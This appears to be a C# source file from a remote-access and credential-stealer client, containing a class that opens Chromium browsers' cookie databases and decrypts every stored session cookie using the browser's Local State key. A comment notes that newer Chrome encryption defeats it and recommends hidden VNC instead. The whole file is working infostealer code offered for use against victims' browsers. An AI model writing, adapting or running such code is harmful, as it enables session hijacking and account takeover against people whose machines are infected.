﻿using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using Pulsar.Client.Kematian.HelpingMethods.Decryption;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;


namespace Pulsar.Client.Kematian.Browsers.Chromium.Cookies
{
    public class CookiesChromium
    {
        public static List<CookieData> GetCookies(string cookiePath, string localstate)
        {
            if (cookiePath.Contains("Google\\Chrome\\User Data"))
            {
                // Google has the new encryption shit and we can't decrypt it. HVNC exists for a reason. Go use it.
                return new List<CookieData>();
            }

            var decrypter = new ChromiumDecryptor(localstate);
            var cookies = new List<CookieData>();
            if (File.Exists(cookiePath))
            {
                SQLiteHandler sqlDatabase;
                try
                {
                    sqlDatabase = new SQLiteHandler(cookiePath);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                    return cookies;
                }
                if (!sqlDatabase.ReadTable("cookies"))
                {
                    Debug.WriteLine("Failed to read 'cookies' table from database.");
                    return cookies;
                }
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var host_key = sqlDatabase.GetValue(i, "host_key");
                        var path = sqlDatabase.GetValue(i, "path");
                        var expires_utc = sqlDatabase.GetValue(i, "expires_utc");
                        var name = sqlDatabase.GetValue(i, "name");

                        var decrypted_value = decrypter.Decrypt(sqlDatabase.GetValue(i, "encrypted_value"));

                        cookies.Add(new CookieData(host_key, path, expires_utc, name, decrypted_value));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to retrieve cookie data from database: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("Database file not found.");
            }
            return cookies;
        }
    }
}
